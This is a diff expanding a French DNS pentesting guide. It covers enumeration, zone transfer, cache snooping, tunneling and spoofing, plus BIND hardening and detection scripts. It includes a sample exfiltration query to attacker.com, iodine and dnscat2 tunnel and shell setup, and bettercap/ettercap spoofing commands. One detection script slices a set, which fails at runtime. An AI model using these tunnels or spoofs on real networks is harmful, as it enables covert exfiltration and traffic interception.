@@ -1,142 +1,1072 @@
-# 🌐 DNS - Cheatsheet CyberSécurité
+# 🌐 DNS - Guide Complet
 
-Ce fichier contient les **commandes de base**, **outils d'attaque**, et **techniques de cracking/exploitation DNS**, spécialement utiles en pentest.
-
----
-
-## 🔍 1. Enumération de base
-
-dig domaine.com  
-> Résolution classique (A record)
-
-nslookup domaine.com  
-> Interroge le DNS par défaut
-
-host domaine.com  
-> Résout le domaine
-
-dig NS domaine.com  
-> Récupère les serveurs de noms (Nameservers)
-
-dig MX domaine.com  
-> Récupère les serveurs mails (Mail Exchanger)
-
-host -t txt domaine.com  
-> Cherche des infos dans les enregistrements TXT (souvent SPF, DKIM)
+Guide exhaustif pour l'énumération, l'exploitation et la sécurisation des services DNS, une surface d'attaque souvent sous-estimée mais critique en reconnaissance.
 
 ---
 
-## 🕵️ 2. Découverte de sous-domaines
+## 📖 Concepts de Base
 
-dnsenum domaine.com  
-> Enumération DNS complète + brute-force + transfert de zone
+### Qu'est-ce que le DNS ?
 
-dnsmap domaine.com  
-> Enumération de sous-domaines rapide
+Le **Domain Name System (DNS)** traduit les noms de domaine en adresses IP. En pentesting, le DNS est une mine d'or pour :
+- Découvrir des sous-domaines et services cachés
+- Identifier l'infrastructure réseau
+- Détecter des vulnérabilités de configuration
+- Effectuer des attaques de reconnaissance passive
+- Exploiter des mauvaises configurations (zone transfers, cache poisoning)
 
-gobuster dns -d domaine.com -w wordlist.txt  
-> Brute-force DNS avec wordlist
-
-amass enum -d domaine.com  
-> Enumération massive de sous-domaines (recon OSINT + bruteforce)
-
-subfinder -d domaine.com  
-> Enumération passive via API publiques
-
----
-
-## 📡 3. Résolution inversée
-
-dig -x IP  
-> PTR record (Reverse DNS)
-
-host IP  
-> Alternative simple pour reverse lookup
+**Types d'enregistrements DNS** :
+```
+A       - IPv4 address
+AAAA    - IPv6 address
+CNAME   - Canonical name (alias)
+MX      - Mail exchanger
+NS      - Name server
+TXT     - Text records (SPF, DKIM, etc.)
+PTR     - Pointer (reverse DNS)
+SOA     - Start of Authority
+SRV     - Service locator
+```
 
 ---
 
-## 🔐 4. Transfert de zone (AXFR)
+## 1️⃣ Énumération DNS Basique
 
-dig AXFR domaine.com @ns1.domaine.com  
-> Tente un transfert de zone complet (grave faille si ouvert)
+### Résolution directe
 
-host -l domaine.com ns1.domaine.com  
-> Teste un transfert via `host`
+**dig** :
+```bash
+# Résolution A record
+dig example.com
 
-> ⚠️ Si ça fonctionne, tous les sous-domaines et IP internes sont exposés
+# Résolution spécifique
+dig example.com A
+dig example.com AAAA
+dig example.com MX
+dig example.com NS
+dig example.com TXT
+dig example.com SOA
 
----
+# Résolution courte (IP seulement)
+dig +short example.com
 
-## 💣 5. Attaque DNS Cache Snooping
+# Utiliser un DNS spécifique
+dig @8.8.8.8 example.com
 
-dig @cible.com google.com  
-> Si la réponse est instantanée → domaine déjà résolu → présence d'un client interne
+# Tracer la résolution complète
+dig +trace example.com
 
-> Utile pour savoir quels domaines sont visités par les utilisateurs d’un résolveur DNS
+# Toutes les informations
+dig example.com ANY
 
----
+# Sans récursion
+dig +norecurse example.com @ns1.example.com
+```
 
-## 🧪 6. Brute-force / Fuzzing DNS
+**nslookup** :
+```bash
+# Résolution basique
+nslookup example.com
 
-dnsrecon -d domaine.com -t brt  
-> Fuzz des sous-domaines
+# Résolution avec DNS spécifique
+nslookup example.com 8.8.8.8
 
-massdns -r resolvers.txt -t A -o S -w result.txt wordlist.txt  
-> Résolution massive ultra rapide
+# Mode interactif
+nslookup
+> server 8.8.8.8
+> set type=MX
+> example.com
+> set type=NS
+> example.com
+> exit
+```
 
----
+**host** :
+```bash
+# Résolution simple
+host example.com
 
-## 🧠 7. Scripts Python utiles
+# Type spécifique
+host -t A example.com
+host -t MX example.com
+host -t NS example.com
+host -t TXT example.com
 
-# Résolution simple de tous les enregistrements
+# Verbose
+host -v example.com
 
-import dns.resolver  
-domain = "example.com"  
-for qtype in ["A", "NS", "MX", "TXT"]:  
- answers = dns.resolver.resolve(domain, qtype)  
- for r in answers:  
-  print(f"{qtype} -> {r.to_text()}")
-
----
-
-## 🔓 8. Exploitation & cracking
-
-dig +short txt domaine.com  
-> Cherche des clés, secrets, metadata exposées
-
-findomain -t domaine.com -u result.txt  
-> Trouve des sous-domaines et les enregistrements liés
-
-fierce -dns domaine.com  
-> Enumération complète + scan IP + sous-domaines
-
-cewl http://domaine.com -w wordlist.txt  
-> Génère une wordlist basée sur le contenu du site → utile pour brute-force DNS ou accès
-
----
-
-## 📚 9. Outils à connaître
-
-- `dig`, `host`, `nslookup` → Résolution DNS
-- `dnsenum`, `fierce`, `dnsrecon` → Enumération active
-- `amass`, `subfinder`, `assetfinder` → Recon passive
-- `massdns`, `findomain` → Résolution massive
-- `cewl`, `wfuzz` → Fuzz / wordlist
-
----
-
-## 🛡 10. Défense / Durcissement
-
-- Bloquer le transfert de zone (AXFR)
-- Masquer les sous-domaines sensibles (pas d'entrée DNS publique)
-- Monitorer le trafic DNS sortant
-- Utiliser DNSSEC pour éviter le spoofing
-- Limiter les requêtes à des clients autorisés
+# Utiliser DNS spécifique
+host example.com 8.8.8.8
+```
 
 ---
 
-## 🧭 Ressources
+### Résolution inverse (Reverse DNS)
 
-- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/DNS%20Reconaissance  
-- https://owasp.org/www-community/attacks/DNS_Rebinding  
-- https://github.com/blechschmidt/massdns  
+```bash
+# dig
+dig -x 1.2.3.4
+dig -x 1.2.3.4 +short
+
+# host
+host 1.2.3.4
+
+# nslookup
+nslookup 1.2.3.4
+```
+
+**Script pour reverse DNS sur une plage** :
+```bash
+#!/bin/bash
+# reverse_dns_scan.sh
+
+NETWORK="192.168.1"
+
+for i in {1..254}; do
+    IP="$NETWORK.$i"
+    HOSTNAME=$(dig -x $IP +short 2>/dev/null | grep -v "^;")
+    
+    if [ ! -z "$HOSTNAME" ]; then
+        echo "$IP -> $HOSTNAME"
+    fi
+done
+```
+
+---
+
+## 2️⃣ Découverte de Sous-domaines
+
+### Énumération passive
+
+**Subfinder** :
+```bash
+# Installation
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+
+# Scan basique
+subfinder -d example.com
+
+# Output dans fichier
+subfinder -d example.com -o subdomains.txt
+
+# Résolution DNS
+subfinder -d example.com -nW
+
+# Avec sources spécifiques
+subfinder -d example.com -sources censys,shodan,virustotal
+
+# Verbose
+subfinder -d example.com -v
+
+# Plusieurs domaines
+subfinder -dL domains.txt -o results.txt
+```
+
+**Amass** :
+```bash
+# Installation
+go install -v github.com/OWASP/Amass/v3/...@master
+
+# Énumération passive
+amass enum -d example.com
+
+# Énumération active (bruteforce)
+amass enum -d example.com -active
+
+# Avec wordlist
+amass enum -d example.com -brute -w wordlist.txt
+
+# Output JSON
+amass enum -d example.com -json output.json
+
+# Avec API keys (config file)
+amass enum -d example.com -config config.ini
+
+# Résolution DNS complète
+amass enum -d example.com -ip -src
+
+# Visualisation
+amass viz -d3 -d example.com
+```
+
+**Assetfinder** :
+```bash
+# Installation
+go install github.com/tomnomnom/assetfinder@latest
+
+# Scan
+assetfinder example.com
+
+# Seulement sous-domaines (pas de domaines associés)
+assetfinder --subs-only example.com
+```
+
+**Findomain** :
+```bash
+# Installation
+wget https://github.com/Findomain/Findomain/releases/download/8.2.1/findomain-linux.zip
+unzip findomain-linux.zip
+chmod +x findomain
+
+# Scan
+./findomain -t example.com
+
+# Output
+./findomain -t example.com -u output.txt
+
+# Monitoring mode
+./findomain -t example.com -m
+```
+
+---
+
+### Énumération active (Bruteforce)
+
+**DNSRecon** :
+```bash
+# Installation
+git clone https://github.com/darkoperator/dnsrecon
+cd dnsrecon
+pip3 install -r requirements.txt
+
+# Énumération standard
+python3 dnsrecon.py -d example.com
+
+# Bruteforce avec wordlist
+python3 dnsrecon.py -d example.com -t brt -D subdomains.txt
+
+# Zone transfer
+python3 dnsrecon.py -d example.com -t axfr
+
+# Reverse DNS sur range
+python3 dnsrecon.py -r 192.168.1.0/24
+
+# Cache snooping
+python3 dnsrecon.py -d example.com -t snoop -D domains.txt
+
+# Output XML
+python3 dnsrecon.py -d example.com -x output.xml
+```
+
+**DNSEnum** :
+```bash
+# Installation
+apt install dnsenum
+
+# Scan complet
+dnsenum example.com
+
+# Avec wordlist personnalisée
+dnsenum --enum example.com -f wordlist.txt
+
+# Sans bruteforce
+dnsenum --noreverse example.com
+
+# Threads
+dnsenum --threads 10 example.com
+
+# Output
+dnsenum example.com -o output.txt
+```
+
+**Gobuster DNS** :
+```bash
+# Installation
+go install github.com/OJ/gobuster/v3@latest
+
+# Bruteforce DNS
+gobuster dns -d example.com -w wordlist.txt
+
+# Avec résolution
+gobuster dns -d example.com -w wordlist.txt -i
+
+# Threads
+gobuster dns -d example.com -w wordlist.txt -t 50
+
+# Wildcard detection
+gobuster dns -d example.com -w wordlist.txt --wildcard
+```
+
+**MassDNS** :
+```bash
+# Installation
+git clone https://github.com/blechschmidt/massdns
+cd massdns
+make
+
+# Résolution massive
+./bin/massdns -r resolvers.txt -t A -o S -w results.txt subdomains.txt
+
+# Avec pipeline
+cat subdomains.txt | ./bin/massdns -r resolvers.txt -t A -o S -w results.txt
+
+# Format JSON
+./bin/massdns -r resolvers.txt -t A -o J -w results.json subdomains.txt
+```
+
+**Wordlists recommandées** :
+```bash
+# SecLists
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+
+# Assetnote
+https://wordlists-cdn.assetnote.io/data/manual/best-dns-wordlist.txt
+
+# Custom
+cat > common_subdomains.txt << EOF
+www
+mail
+ftp
+admin
+portal
+vpn
+api
+dev
+test
+staging
+prod
+db
+mysql
+blog
+shop
+cdn
+static
+assets
+files
+upload
+downloads
+EOF
+```
+
+---
+
+## 3️⃣ Zone Transfer (AXFR)
+
+### Principe
+
+Un **zone transfer** permet de récupérer tous les enregistrements DNS d'un domaine. Si mal configuré, c'est une faille critique exposant toute l'infrastructure.
+
+### Exploitation
+
+**dig** :
+```bash
+# Identifier les nameservers
+dig NS example.com +short
+
+# Tester zone transfer sur chaque NS
+dig AXFR example.com @ns1.example.com
+dig AXFR example.com @ns2.example.com
+
+# Avec output
+dig AXFR example.com @ns1.example.com > zone_transfer.txt
+```
+
+**host** :
+```bash
+# Test zone transfer
+host -l example.com ns1.example.com
+
+# Alternative avec -t
+host -t AXFR example.com ns1.example.com
+```
+
+**Script automatisé** :
+```bash
+#!/bin/bash
+# zone_transfer_test.sh
+
+DOMAIN=$1
+
+if [ -z "$DOMAIN" ]; then
+    echo "Usage: $0 <domain>"
+    exit 1
+fi
+
+echo "[*] Testing zone transfer for $DOMAIN"
+
+# Récupérer les nameservers
+NS_SERVERS=$(dig NS $DOMAIN +short)
+
+if [ -z "$NS_SERVERS" ]; then
+    echo "[-] No nameservers found"
+    exit 1
+fi
+
+echo "[+] Found nameservers:"
+echo "$NS_SERVERS"
+echo ""
+
+# Tester chaque nameserver
+for NS in $NS_SERVERS; do
+    echo "[*] Testing zone transfer on $NS"
+    dig AXFR $DOMAIN @$NS +noall +answer
+    
+    if [ $? -eq 0 ]; then
+        echo "[+] Zone transfer successful on $NS!"
+    else
+        echo "[-] Zone transfer failed on $NS"
+    fi
+    echo ""
+done
+```
+
+**DNSRecon** :
+```bash
+# Test automatique de tous les NS
+python3 dnsrecon.py -d example.com -t axfr
+```
+
+---
+
+## 4️⃣ DNS Cache Snooping
+
+### Principe
+
+Le **cache snooping** permet de déterminer quels domaines ont été récemment résolus par un serveur DNS, révélant l'activité des utilisateurs.
+
+### Exploitation
+
+**dig** :
+```bash
+# Test sans récursion (vérifie le cache)
+dig @target-dns.com google.com +norecurse
+
+# Si réponse immédiate = domaine en cache
+# Si SERVFAIL ou délai = pas en cache
+```
+
+**Script de snooping** :
+```bash
+#!/bin/bash
+# dns_cache_snoop.sh
+
+DNS_SERVER=$1
+DOMAINS_FILE=$2
+
+if [ -z "$DNS_SERVER" ] || [ -z "$DOMAINS_FILE" ]; then
+    echo "Usage: $0 <dns_server> <domains_file>"
+    exit 1
+fi
+
+echo "[*] Testing DNS cache on $DNS_SERVER"
+
+while read domain; do
+    # Requête non-récursive
+    RESULT=$(dig @$DNS_SERVER $domain +norecurse +short 2>&1)
+    
+    if [ ! -z "$RESULT" ] && [[ ! "$RESULT" =~ "SERVFAIL" ]]; then
+        echo "[+] $domain is in cache: $RESULT"
+    fi
+done < $DOMAINS_FILE
+```
+
+**DNSRecon** :
+```bash
+# Cache snooping automatisé
+python3 dnsrecon.py -d example.com -t snoop -D domains.txt --name_server 8.8.8.8
+```
+
+---
+
+## 5️⃣ DNS Tunneling & Exfiltration
+
+### Détection de DNS tunneling
+
+**Indicators** :
+```bash
+# Volume anormal de requêtes
+# Sous-domaines très longs
+# Requêtes TXT inhabituelles
+# Patterns encodés (base64, hex)
+
+# Exemple de requête suspecte
+dig dGVzdCBkYXRhIGV4ZmlsdHJhdGlvbg.attacker.com TXT
+```
+
+**Script de détection** :
+```python
+#!/usr/bin/env python3
+# detect_dns_tunnel.py
+
+import re
+from collections import defaultdict
+
+def analyze_dns_logs(logfile):
+    """Détecte des patterns de DNS tunneling"""
+    
+    domain_counts = defaultdict(int)
+    long_queries = []
+    suspicious_tld = []
+    
+    with open(logfile, 'r') as f:
+        for line in f:
+            # Extraire le domaine (simplifié)
+            match = re.search(r'query: (\S+)', line)
+            if match:
+                domain = match.group(1)
+                domain_counts[domain] += 1
+                
+                # Sous-domaine très long (>50 chars)
+                subdomain = domain.split('.')[0]
+                if len(subdomain) > 50:
+                    long_queries.append(domain)
+                
+                # TLD suspect
+                if domain.endswith(('.tk', '.ga', '.cf', '.ml')):
+                    suspicious_tld.append(domain)
+    
+    # Rapport
+    print("[*] DNS Tunneling Detection Report")
+    print(f"\n[+] Total unique domains: {len(domain_counts)}")
+    
+    # Domaines avec beaucoup de requêtes
+    print("\n[*] High frequency domains (possible C2):")
+    for domain, count in sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:10]:
+        if count > 100:
+            print(f"  - {domain}: {count} requests")
+    
+    # Requêtes longues
+    if long_queries:
+        print(f"\n[!] Long subdomains detected ({len(long_queries)}):")
+        for query in long_queries[:10]:
+            print(f"  - {query}")
+    
+    # TLD suspects
+    if suspicious_tld:
+        print(f"\n[!] Suspicious TLDs detected ({len(suspicious_tld)}):")
+        for domain in set(suspicious_tld)[:10]:
+            print(f"  - {domain}")
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <dns_logfile>")
+        sys.exit(1)
+    
+    analyze_dns_logs(sys.argv[1])
+```
+
+---
+
+### Outils de DNS tunneling
+
+**Iodine** :
+```bash
+# Installation
+apt install iodine
+
+# Serveur (attaquant)
+sudo iodined -f -c -P password 10.0.0.1 tunnel.attacker.com
+
+# Client (cible)
+sudo iodine -f -P password tunnel.attacker.com
+
+# Tunnel établi sur interface dns0
+# Utiliser pour SSH, reverse shell, etc.
+ssh user@10.0.0.1
+```
+
+**DNSCat2** :
+```bash
+# Installation
+git clone https://github.com/iagox86/dnscat2
+cd dnscat2/server
+bundle install
+
+# Serveur (attaquant)
+ruby dnscat2.rb tunnel.attacker.com
+
+# Client (cible)
+./dnscat --dns server=tunnel.attacker.com
+
+# Dans la session dnscat
+session -i 1
+shell
+```
+
+---
+
+## 6️⃣ DNS Spoofing & Cache Poisoning
+
+### DNS Spoofing local (ARP + DNS)
+
+**Bettercap** :
+```bash
+# Installation
+apt install bettercap
+
+# Lancer
+sudo bettercap -iface eth0
+
+# Dans bettercap
+set dns.spoof.domains example.com
+set dns.spoof.address 192.168.1.100
+dns.spoof on
+arp.spoof on
+```
+
+**Ettercap** :
+```bash
+# Installation
+apt install ettercap-graphical
+
+# DNS spoofing
+# Éditer /etc/ettercap/etter.dns
+echo "example.com A 192.168.1.100" >> /etc/ettercap/etter.dns
+
+# Lancer
+sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof //192.168.1.1/ //192.168.1.0/24/
+```
+
+---
+
+### DNS Cache Poisoning (Kaminsky Attack)
+
+**Principe** :
+```
+1. Attaquant envoie requête légitime
+2. Inonde le serveur de fausses réponses
+3. Si une réponse arrive avant la légitime
+4. Cache empoisonné avec fausse IP
+```
+
+**Protection** :
+```bash
+# Vérifier randomisation des ports
+dig @8.8.8.8 example.com +stats | grep "Query time"
+
+# DNSSEC
+dig +dnssec example.com
+
+# Tester si DNSSEC actif
+dig @8.8.8.8 example.com +dnssec | grep "ad"
+```
+
+---
+
+## 7️⃣ DNS Reconnaissance Avancée
+
+### Récupération de métadonnées
+
+**DNS Dumpster** :
+```bash
+# API (si disponible)
+curl https://api.dnsdumpster.com/ -d "domain=example.com"
+```
+
+**Crt.sh (Certificate Transparency)** :
+```bash
+# Récupérer sous-domaines via CT logs
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Script
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | grep -v "@" > subdomains.txt
+```
+
+**Shodan** :
+```bash
+# Via API
+curl "https://api.shodan.io/dns/domain/example.com?key=YOUR_KEY"
+
+# CLI
+shodan domain example.com
+```
+
+**SecurityTrails** :
+```bash
+# API
+curl -H "APIKEY: YOUR_KEY" "https://api.securitytrails.com/v1/domain/example.com/subdomains"
+```
+
+---
+
+### Découverte via Google Dorks
+
+```bash
+# Sous-domaines
+site:example.com -www
+
+# Sous-domaines spécifiques
+site:*.example.com
+
+# Fichiers exposés
+site:example.com filetype:txt | filetype:pdf | filetype:xls
+
+# Panels admin
+site:example.com inurl:admin | inurl:login | inurl:portal
+```
+
+---
+
+### DNS Walking (NSEC records)
+
+**Principe** : Exploiter DNSSEC NSEC records pour énumérer tous les sous-domaines.
+
+```bash
+# ldns-walk (DNSSEC zone enumeration)
+apt install ldns-utils
+
+# Walking
+ldns-walk example.com
+
+# Ou avec dig
+dig example.com NSEC +dnssec
+```
+
+---
+
+## 8️⃣ Scripts d'Automatisation
+
+### Scanner DNS complet
+
+```python
+#!/usr/bin/env python3
+# dns_full_scan.py
+
+import dns.resolver
+import dns.zone
+import dns.query
+import sys
+from concurrent.futures import ThreadPoolExecutor
+
+def resolve_domain(domain, record_type='A'):
+    """Résout un domaine pour un type donné"""
+    try:
+        answers = dns.resolver.resolve(domain, record_type)
+        return [str(r) for r in answers]
+    except:
+        return []
+
+def test_zone_transfer(domain):
+    """Test zone transfer sur tous les NS"""
+    results = []
+    try:
+        ns_records = resolve_domain(domain, 'NS')
+        for ns in ns_records:
+            try:
+                zone = dns.zone.from_xfr(dns.query.xfr(ns, domain))
+                results.append(f"[+] Zone transfer successful on {ns}")
+                for name, node in zone.nodes.items():
+                    results.append(f"  {name}.{domain}")
+            except:
+                pass
+    except:
+        pass
+    return results
+
+def bruteforce_subdomains(domain, wordlist):
+    """Bruteforce sous-domaines"""
+    found = []
+    
+    def check_subdomain(sub):
+        subdomain = f"{sub}.{domain}"
+        ips = resolve_domain(subdomain)
+        if ips:
+            return (subdomain, ips)
+        return None
+    
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        results = executor.map(check_subdomain, wordlist)
+        for result in results:
+            if result:
+                found.append(result)
+    
+    return found
+
+def full_scan(domain):
+    """Scan DNS complet"""
+    print(f"[*] DNS Full Scan: {domain}\n")
+    
+    # Records basiques
+    print("[*] Basic Records:")
+    for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']:
+        records = resolve_domain(domain, rtype)
+        if records:
+            print(f"  {rtype}:")
+            for r in records:
+                print(f"    - {r}")
+    
+    # Zone transfer
+    print("\n[*] Testing Zone Transfer:")
+    zt_results = test_zone_transfer(domain)
+    if zt_results:
+        for line in zt_results:
+            print(line)
+    else:
+        print("  [-] No zone transfer available")
+    
+    # Bruteforce (mini wordlist)
+    print("\n[*] Bruteforcing common subdomains:")
+    common_subs = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api', 'portal']
+    found = bruteforce_subdomains(domain, common_subs)
+    for subdomain, ips in found:
+        print(f"  [+] {subdomain}: {', '.join(ips)}")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <domain>")
+        sys.exit(1)
+    
+    full_scan(sys.argv[1])
+```
+
+---
+
+### Monitoring de changements DNS
+
+```python
+#!/usr/bin/env python3
+# dns_monitor.py
+
+import dns.resolver
+import time
+import json
+from datetime import datetime
+
+def get_dns_records(domain):
+    """Récupère tous les records DNS"""
+    records = {}
+    for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT']:
+        try:
+            answers = dns.resolver.resolve(domain, rtype)
+            records[rtype] = [str(r) for r in answers]
+        except:
+            records[rtype] = []
+    return records
+
+def monitor_dns(domain, interval=300):
+    """Monitore les changements DNS"""
+    print(f"[*] Monitoring DNS for {domain}")
+    print(f"[*] Check interval: {interval}s\n")
+    
+    previous = get_dns_records(domain)
+    
+    while True:
+        time.sleep(interval)
+        
+        current = get_dns_records(domain)
+        
+        # Comparer
+        changes = False
+        for rtype in current:
+            if set(current[rtype]) != set(previous[rtype]):
+                changes = True
+                print(f"[!] {datetime.now()} - Change detected in {rtype}:")
+                print(f"    Old: {previous[rtype]}")
+                print(f"    New: {current[rtype]}\n")
+        
+        if not changes:
+            print(f"[+] {datetime.now()} - No changes detected")
+        
+        previous = current
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <domain> [interval_seconds]")
+        sys.exit(1)
+    
+    domain = sys.argv[1]
+    interval = int(sys.argv[2]) if len(sys.argv) > 2 else 300
+    
+    monitor_dns(domain, interval)
+```
+
+---
+
+## 9️⃣ Protection et Mitigation
+
+### Sécurisation du serveur DNS
+
+**BIND9 configuration** :
+```bash
+# /etc/bind/named.conf.options
+
+options {
+    directory "/var/cache/bind";
+    
+    # Désactiver récursion pour le monde
+    recursion no;
+    allow-recursion { 127.0.0.1; 192.168.1.0/24; };
+    
+    # Désactiver zone transfers
+    allow-transfer { none; };
+    
+    # Rate limiting
+    rate-limit {
+        responses-per-second 5;
+        window 5;
+    };
+    
+    # Version hiding
+    version "Not Available";
+    
+    # DNSSEC
+    dnssec-validation auto;
+    
+    # Forwarders
+    forwarders {
+        8.8.8.8;
+        8.8.4.4;
+    };
+};
+
+# Zone configuration
+zone "example.com" {
+    type master;
+    file "/etc/bind/zones/example.com.db";
+    allow-transfer { 192.168.1.2; };  # Secondary NS only
+    also-notify { 192.168.1.2; };
+};
+```
+
+---
+
+### DNSSEC Implementation
+
+```bash
+# Générer clés DNSSEC
+dnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.com
+dnssec-keygen -f KSK -a RSASHA256 -b 4096 -n ZONE example.com
+
+# Signer la zone
+dnssec-signzone -o example.com -k Kexample.com.+008+12345.key example.com.db Kexample.com.+008+54321.key
+
+# Vérifier
+dnssec-verify -o example.com example.com.db.signed
+
+# Publier DS records chez le registrar
+```
+
+---
+
+### Monitoring et Logging
+
+**Query logging (BIND)** :
+```bash
+# /etc/bind/named.conf.local
+logging {
+    channel query_log {
+        file "/var/log/bind/query.log" versions 3 size 5m;
+        severity info;
+        print-time yes;
+        print-severity yes;
+        print-category yes;
+    };
+    
+    category queries { query_log; };
+};
+```
+
+**Analyse des logs** :
+```bash
+# Requêtes les plus fréquentes
+cat /var/log/bind/query.log | grep "query:" | awk '{print $NF}' | sort | uniq -c | sort -rn | head -20
+
+# Détection de scan
+cat /var/log/bind/query.log | grep "query:" | awk '{print $(NF-2)}' | sort | uniq -c | sort -rn | head -20
+
+# Requêtes NXDOMAIN (domaines inexistants)
+grep "NXDOMAIN" /var/log/bind/query.log | awk '{print $NF}' | sort | uniq -c | sort -rn
+```
+
+---
+
+### Détection d'attaques
+
+**Script de détection** :
+```bash
+#!/bin/bash
+# detect_dns_attacks.sh
+
+LOG_FILE="/var/log/bind/query.log"
+THRESHOLD=100
+
+echo "[*] Analyzing DNS logs for attacks"
+
+# Détection de scan (trop de requêtes d'une IP)
+echo -e "\n[*] Potential DNS scanners:"
+awk '/query:/ {print $(NF-2)}' $LOG_FILE | sort | uniq -c | sort -rn | awk -v t=$THRESHOLD '$1 > t {print "  [!] " $2 " - " $1 " requests"}'
+
+# Zone transfer attempts
+echo -e "\n[*] Zone transfer attempts:"
+grep "AXFR" $LOG_FILE | awk '{print $(NF-2)}' | sort | uniq -c | sort -rn
+
+# Long subdomains (possible tunneling)
+echo -e "\n[*] Suspicious long queries:"
+awk '/query:/ {if (length($NF) > 50) print "  " $NF}' $LOG_FILE | head -10
+
+# Failed queries (NXDOMAIN)
+echo -e "\n[*] Top NXDOMAIN queries:"
+grep "NXDOMAIN" $LOG_FILE | awk '{print $NF}' | sort | uniq -c | sort -rn | head -10
+```
+
+---
+
+## 🔟 Cheatsheet Rapide
+
+```bash
+# === ÉNUMÉRATION BASIQUE ===
+
+# Résolution
+dig example.com
+dig example.com MX
+dig example.com NS
+dig example.com TXT
+dig +short example.com
+
+# Reverse DNS
+dig -x 1.2.3.4
+host 1.2.3.4
+
+# Tracer résolution
+dig +trace example.com
+
+
+# === SOUS-DOMAINES ===
+
+# Passive
+subfinder -d example.com
+amass enum -d example.com
+assetfinder example.com
+
+# Active
+gobuster dns -d example.com -w wordlist.txt
+python3 dnsrecon.py -d example.com -t brt -D wordlist.txt
+dnsenum example.com
+
+# Certificate Transparency
+curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u
+
+
+# === ZONE TRANSFER ===
+
+# Test AXFR
+dig AXFR example.com @ns1.example.com
+host -l example.com ns1.example.com
+python3 dnsrecon.py -d example.com -t axfr
+
+
+# === CACHE SNOOPING ===
+
+dig @dns-server.com google.com +norecurse
+python3 dnsrecon.py -t snoop -D domains.txt --name_server 8.8.8.8
+
+
+# === OUTILS ===
+
+# Amass
+amass enum -d example.com -active -ip
+
+# DNSRecon
+python3 dnsrecon.py -d example.com
+
+# Subfinder
+subfinder -d example.com -nW -o results.txt
+
+# MassDNS
+./massdns -r resolvers.txt -t A -o S -w results.txt subdomains.txt
+
+
